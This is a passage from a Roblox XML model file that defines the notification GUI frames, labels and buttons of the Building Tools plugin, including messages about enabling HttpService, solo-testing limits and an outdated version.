											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="IntValue" referent="RBX1F16BC1F08E04BB08E7402E83BCE6014">
										<Properties>
											<string name="Name">NotificationSize</string>
											<int name="Value">-48</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX33526BBAA22D4C23830D82EED474D334">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Help</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXBBBEC0D40B894DE68D846167E6C40420">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">4</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>10</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-20</XO>
												<YS>0.699999988</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Own this place? Open it in Studio, select HttpService in the explorer, and make sure HttpEnabled is checked in the properties.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">0</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBXC20401294F2F47089BFBBC9DC8441F55">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">3</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>10</XO>
												<YS>0.649999976</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>0.300000012</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Otherwise, tell the owner to do the above.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">0</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="IntValue" referent="RBX1A698A10C36F454092C542EE556542E4">
										<Properties>
											<string name="Name">NotificationSize</string>
											<int name="Value">-18</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXF6C43C55851249C89259BFA3DE1DEF22">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.699999988</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">SoloWarning</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>80</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX1A081678B1E447A2AAFB6DBED3FD3A5A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294901764</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXC38981FC2C8C43FEA8042D32D6487714">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.800000012</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">OKButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">GOT IT</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX517A36F50AB14D358F1B17CEC5D303F6">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.800000012</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">HelpButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">WHAT CAN I DO?</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXA6D34ECEF8934DB8B9B2E8056B6507B1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ButtonSeparator</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>1</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX4980279D0B2740D48ECBBD91AEA0381E">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Notice</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX1E4C71AC26F5471AA8C7FD2116CA188C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">4</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>10</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-20</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Some features are not available on build mode or during solo testing, including exporting.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="IntValue" referent="RBX961AB28E4C94454C928A0AF17D142430">
										<Properties>
											<string name="Name">NotificationSize</string>
											<int name="Value">-48</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXFFD51D611DA241C1A93CEA8B17C2D68A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Help</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXD12090708C6C4A61A4EB5A8EF03844EE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">4</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>10</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-20</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">For all features to be available, you should be in a game server (a regular game, or personal building server). Alternatively, you could use the Studio plugin version of Building Tools.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="IntValue" referent="RBXEEECF6A6FEE7455F928F1622A4314B33">
										<Properties>
											<string name="Name">NotificationSize</string>
											<int name="Value">-18</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX5EB15962F7204F73BC937431E3DAB05C">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.699999988</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">PluginUpdateNotification</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>65</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXCF0AEF03C51F48A19CA01D9D77B5CED4">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294945280</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX2E5218BE92D64077AD1254BD3DB6BE4F">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.800000012</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">OKButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">GOT IT</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX518C5646896E49B997C99273ADDEC492">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.800000012</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">HelpButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">WHAT CAN I DO?</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXA49B1CD03E9647079E4EC3376618AFBC">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ButtonSeparator</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>1</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX54F6F5A9B3D6428EA9AAF596E1C83104">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Notice</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX439E9681D38E46DB81EE26D95D99775F">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">4</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">This version of Building Tools is outdated.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="IntValue" referent="RBX29FA8D21776A410B88705D64A1CB7741">
										<Properties>
											<string name="Name">NotificationSize</string>
											<int name="Value">-63</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX20375070EF434C7288F7C25985D8E2CD">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Help</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
